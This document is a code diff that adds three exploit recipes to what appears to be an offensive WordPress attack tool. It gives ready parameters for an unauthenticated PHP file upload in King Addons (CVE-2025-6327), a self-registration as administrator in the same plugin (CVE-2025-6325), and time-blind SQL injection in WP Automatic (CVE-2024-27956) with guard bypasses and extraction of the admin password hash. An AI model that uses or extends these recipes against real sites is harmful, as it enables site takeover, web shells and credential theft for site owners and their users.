@@ -183,6 +183,45 @@ RECIPES = [
                 "requires 'Host Files Locally - Gravatars' enabled (non-"
                 "default) and comments open on the target post.",
     },
+    {
+        "plugin": "king-addons",
+        "cve": "CVE-2025-6327",
+        "affected": "<=51.1.14",
+        "method": "POST",
+        "endpoint": "/wp-admin/admin-ajax.php",
+        "params": {"action": "king_addons_upload_file", "triggering_event": "click"},
+        "field": "uploaded_file",
+        "upload_path": "/wp-content/uploads/king-addons/forms/{filename}",
+        # Verified against the real plugin source (v51.1.14, includes/widgets/
+        # Form_Builder/helpers/Upload_Email_File.php): file_validity() returns
+        # the STRING 'mailto:bug@kingaddons.com?...' (truthy in PHP) instead of
+        # `false` whenever wp_check_filetype($file['name'])['ext'] is empty --
+        # which it always is for '.php' (never a WP-core-recognized upload
+        # type). The caller does `if (!$this->file_validity($file))`, so that
+        # truthy string is negated to `false` -> the reject branch never runs,
+        # and the extension exclusion list (which DOES block php/phtml/etc) is
+        # never even reached. `triggering_event=click` is required or the file
+        # is validated but never actually move_uploaded_file()'d to disk.
+        # NOTE ON VERSION RANGE: public advisories (Wordfence/Patchstack) claim
+        # fixed in 51.1.37, but 51.1.35's own changelog already says "Security
+        # enhancements across the plugin" and its file_validity() already adds
+        # current_user_can('upload_files') + a MIME whitelist + content
+        # scanning -- so the true window is likely narrower than advertised.
+        # Scoped honestly here to 51.1.14, which is directly source-confirmed
+        # vulnerable (no such hardening present).
+        "nonce_from": {"url": "/", "key": "nonce", "object": "KingAddonsFormBuilderData",
+                       "param": "king_addons_fb_nonce"},
+        "source": "registry",
+        "note": "Unauth arbitrary file upload (CVE-2025-6327): file_validity() "
+                "returns a truthy error string instead of false for an "
+                "unrecognized extension like .php, so `!file_validity()` "
+                "bypasses validation entirely -- the extension blacklist is "
+                "never reached. Nonce is wp_localize_script'd globally "
+                "(KING_ADDONS_WGT_FORM_BUILDER is a hardcoded true, not "
+                "per-page), no special page setup needed. Confirmed <=51.1.14 "
+                "from source; advertised fix version (51.1.37) may overstate "
+                "the true vulnerable range.",
+    },
 ]
 
 
@@ -344,6 +383,52 @@ PRIVESC_RECIPES = [
                 "creds (default target 'admin') → Track-B authshell → shell. "
                 "Gated to EA lite 5.4.0-5.7.1 (fixed 5.7.2).",
     },
+    {
+        "plugin": "king-addons",
+        "cve": "CVE-2025-6325",
+        "affected": "<=51.1.14",
+        "kind": "register-role",
+        "endpoint": "/wp-admin/admin-ajax.php",
+        "action": "king_addons_user_register",
+        "user_field": "username",
+        "email_field": "email",
+        "pass_field": "password",
+        "pass_confirm_field": "confirm_password",
+        "role_param": "user_role",
+        "role_value": "administrator",
+        # Verified against the real plugin source (v51.1.14,
+        # Login_Register_Form_Ajax.php::handle_register_ajax(), hooked
+        # unconditionally on both wp_ajax_king_addons_user_register AND
+        # wp_ajax_nopriv_king_addons_user_register in Core.php): user_role is
+        # read straight off $_POST with sanitize_text_field() and NO allowlist
+        # -- any non-empty, non-'subscriber' string becomes $user_data['role']
+        # verbatim before wp_insert_user(). (51.1.35+ adds an explicit
+        # allowed_roles=['subscriber','customer'] check per its own changelog
+        # entry "Security enhancements across the plugin" -- confirmed via
+        # source diff, not just the advisory.) Requires 'users_can_register'
+        # enabled server-side, but any site with this widget actually placed
+        # needs that on anyway for the widget to function for anyone.
+        # Nonce is JS-localized (RegisterAssets.php) as
+        # king_addons_login_register_vars.register_nonce -- but ONLY on a page
+        # that actually renders the login-register-form Elementor widget
+        # (condition: $widget_id === 'login-register-form'), and the plugin
+        # ALSO localizes unrelated nonces under the same literal "nonce" key
+        # elsewhere on the page -- object-scoping to
+        # king_addons_login_register_vars specifically is required, a bare
+        # key search would grab the wrong one.
+        "nonce_from": {"url": "/", "key": "register_nonce",
+                       "object": "king_addons_login_register_vars", "param": "nonce"},
+        "source": "registry",
+        "note": "Unauth privesc-to-admin (CVE-2025-6325): the registration "
+                "AJAX handler accepts an attacker-chosen user_role with no "
+                "validation, landing straight in wp_insert_user(). Requires a "
+                "page with the Login|Register Form widget placed on it (for "
+                "both the nonce to be exposed and registration to be a live "
+                "feature at all). Confirmed <=51.1.14 from source; advertised "
+                "fix version (51.1.36) may overstate the true vulnerable "
+                "range -- 51.1.35 already ships an explicit allowed_roles "
+                "check per source diff.",
+    },
 ]
 
 
@@ -394,6 +479,49 @@ SQLI_RECIPES = [
                 "operation=wpgmp_processor + page=wpgmp_manage_map into "
                 "prepare_items(), whose raw `order by {orderby}` runs pre-auth. "
                 "Confirmed live: +5s SLEEP delta on WP MAPS 4.9.1.",
+    },
+    {
+        "plugin": "wp-automatic",
+        "cve": "CVE-2024-27956",
+        "affected": "<=3.92.0",
+        "kind": "time-blind",
+        "method": "GET",
+        "endpoint": "/wp-content/plugins/wp-automatic/inc/csv.php",
+        # auth is a NULL byte ("\x00" → &auth=%00 on the wire), NOT the literal
+        # string "%00": the requests layer percent-encodes the real null byte, and
+        # the server url-decodes it back to a null. For an unauth caller
+        # $current_user->user_pass is empty, and the null auth defeats the guard's
+        # short-circuit so execution reaches $wpdb->get_results($_REQUEST['q']).
+        "params": {"auth": "\x00"},
+        "inject_param": "q",
+        "inject_in": "params",
+        # The other guard is integ == md5(q). Because q is the WHOLE injected query
+        # and changes every request, the engine recomputes integ per request
+        # (wp_sqli._timed's `integrity` support) rather than templating a static
+        # hash. Mechanism verified against the public PoC's known (q, md5) pairs.
+        "integrity": {"param": "integ", "algo": "md5"},
+        # Unlike the gmap ORDER BY sink, q is arbitrary SQL — a standalone SELECT
+        # that sleeps under the true condition. Same {cond}/{sleep} contract, so
+        # confirm() (timing delta) and extract() (ADMIN_HASH, char-by-char) both
+        # work unchanged; --sqli-extract can dump the admin password hash here.
+        "payload": "SELECT IF(({cond}),SLEEP({sleep}),0)",
+        "true_cond": "1=1",
+        "false_cond": "1=2",
+        "source": "registry",
+        # SOURCE-CONFIRMED, NOT YET LIVE-FIRED. WP Automatic (ValvePress) is a
+        # premium plugin, mass-exploited in the wild (~5.5M attacks, late 03/2024,
+        # CVSS 9.9). inc/csv.php passes $_REQUEST['q'] straight into
+        # $wpdb->get_results() behind the two guards above, both bypassed as noted.
+        # Detection auto-probes the wp-automatic slug (SQLI_RECIPES union in
+        # wp_fingerprint); the slug ships a readme.txt so version-gating works.
+        "note": "Unauth arbitrary SQL execution (CVE-2024-27956, WP Automatic "
+                "<=3.92.0, mass-exploited 03/2024). inc/csv.php runs "
+                "$wpdb->get_results($_REQUEST['q']) behind two bypassed guards: "
+                "auth=%00 (NULL byte) defeats the auth short-circuit, and integ "
+                "must equal md5(q) — recomputed per request since q is the whole "
+                "injected query. Time-based blind SLEEP proves execution; "
+                "--sqli-extract then reads the admin hash. integ=md5(q) verified "
+                "against the public PoC's known pairs. Not yet live-fired.",
     },
 ]
 
